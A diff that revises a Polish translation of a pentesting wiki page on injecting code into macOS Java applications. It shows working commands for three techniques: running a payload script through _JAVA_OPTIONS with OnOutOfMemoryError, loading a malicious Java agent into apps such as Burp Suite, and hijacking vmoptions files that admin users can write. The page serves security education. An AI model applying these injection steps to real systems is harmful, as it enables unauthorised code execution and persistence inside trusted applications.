@@ -1,10 +1,10 @@
-# Injection do aplikacji Java
+# macOS Java Applications Injection
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Enumeracja
+## Rozpoznanie
 
-Znajdź aplikacje Java zainstalowane w systemie. Zauważono, że aplikacje Java w pliku **Info.plist** zawierają pewne parametry Java z ciągiem **`java.`**, dlatego można go wyszukać:
+Znajdź aplikacje Java zainstalowane w systemie. Zauważono, że aplikacje Java w pliku **Info.plist** będą zawierać pewne parametry Java, które zawierają ciąg **`java.`**, więc możesz go wyszukać:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,7 +14,7 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-Zmienna środowiskowa **`_JAVA_OPTIONS`** może być używana do wstrzykiwania dowolnych parametrów Java podczas wykonywania skompilowanej aplikacji Java:
+Zmienna środowiskowa **`_JAVA_OPTIONS`** może być używana do wstrzykiwania dowolnych parametrów Java VM podczas uruchamiania aplikacji Java.<sup>[[1]](#references)</sup>
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Jednak spowoduje to błąd w uruchomionej aplikacji; innym, bardziej skrytym sposobem jest utworzenie agenta Java i użycie:
+Jednak ta technika powoduje błąd w uruchomionej aplikacji. Bardziej skrytą alternatywą jest utworzenie Java agent i użycie `-javaagent`:<sup>[[2]](#references)</sup>
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,7 +83,7 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> Utworzenie agenta przy użyciu **innej wersji Javy** niż wersja używana przez aplikację może spowodować awarię zarówno agenta, jak i aplikacji.
+> Utworzenie agenta przy użyciu **innej wersji Java** niż wersja używana przez aplikację może spowodować awarię zarówno agenta, jak i aplikacji.
 
 Agent może znajdować się:
 ```java:Agent.java
@@ -107,7 +107,7 @@ Aby skompilować agenta, uruchom:
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
 ```
-Z użyciem `manifest.txt`:
+Z `manifest.txt`:
 ```
 Premain-Class: Agent
 Agent-Class: Agent
@@ -123,14 +123,14 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-## plik vmoptions
+## Plik vmoptions
 
-Ten plik obsługuje specyfikację **parametrów Java** podczas uruchamiania Java. Możesz użyć niektórych wcześniejszych trików, aby zmienić parametry Java i **sprawić, że proces wykona dowolne polecenia**.\
-Ponadto ten plik może również **dołączać inne pliki** za pomocą katalogu `include`, więc możesz także zmienić dołączony plik.
+Ten plik umożliwia określenie **parametrów Java** podczas uruchamiania Java. Możesz użyć niektórych wcześniejszych technik, aby zmienić parametry Java i **sprawić, by proces wykonywał dowolne polecenia**.\
+Ponadto ten plik może również **dołączać inne pliki** za pomocą dyrektywy `include`, więc możesz także zmienić dołączony plik.
 
-Co więcej, niektóre aplikacje Java będą **ładować więcej niż jeden** plik `vmoptions`.
+Co więcej, niektóre aplikacje Java będą **wczytywać więcej niż jeden** plik `vmoptions`.
 
-Niektóre aplikacje, takie jak Android Studio, wskazują w swoim **wyjściu, gdzie szukają** tych plików, na przykład:
+Niektóre aplikacje, takie jak Android Studio, wskazują w swoich **danych wyjściowych, gdzie szukają** tych plików:<sup>[[3]](#references)</sup>
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +141,7 @@ Niektóre aplikacje, takie jak Android Studio, wskazują w swoim **wyjściu, gdz
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-Jeśli tego nie zrobią, możesz to łatwo sprawdzić za pomocą:
+Jeśli nie, możesz to sprawdzić za pomocą:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -149,6 +149,11 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Zauważ, że interesujące jest to, iż Android Studio w tym przykładzie próbuje załadować plik **`/Applications/Android Studio.app.vmoptions`** — lokalizację, do której każdy użytkownik z grupy **`admin`** ma dostęp z prawem zapisu.
+Zauważ, że Android Studio w tym przykładzie próbuje załadować **`/Applications/Android Studio.app.vmoptions`**, lokalizację, do której każdy użytkownik w grupie **`admin` ma dostęp z prawem zapisu**.
 
+## References
+
+- [1] [OpenJDK — analiza `_JAVA_OPTIONS` w `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
+- [2] [Oracle Java — specyfikacja pakietu `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
+- [3] [JetBrains — konfigurowanie opcji JVM i właściwości platformy](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
 {{#include ../../../banners/hacktricks-training.md}}
